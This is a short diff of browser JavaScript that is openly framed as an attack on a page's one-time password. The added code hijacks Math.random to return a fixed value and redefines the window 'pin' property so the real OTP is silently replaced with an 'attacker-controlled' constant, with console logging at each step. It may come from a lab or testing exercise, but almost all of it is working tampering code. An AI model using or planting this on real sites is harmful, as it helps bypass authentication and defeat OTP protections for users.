@@ -17,3 +17,29 @@ Object.defineProperty(window, 'pin', {
     }
 });
 
+
+
+
+// Step 1: Store the original Math.random
+const originalRandom = Math.random;
+
+// Step 2: Override Math.random to log and store real value
+let realRandomValue = null;
+Math.random = function () {
+    realRandomValue = originalRandom(); // Call real random
+    console.log("✅ Real Math.random value:", realRandomValue);
+    return 0.12345678; // Return attacker-controlled fake value
+};
+
+// Step 3: Intercept and override the OTP
+Object.defineProperty(window, 'pin', {
+    set(value) {
+        console.log("⚠️ Original OTP (from real Math.random):", value);
+        const attackerOTP = 21111110; // Your fake predictable OTP
+        console.log("🚨 Replacing OTP with attacker-controlled value:", attackerOTP);
+        window.interceptedOTP = attackerOTP; // Replace it silently
+    },
+    get() {
+        return window.interceptedOTP;
+    }
+});
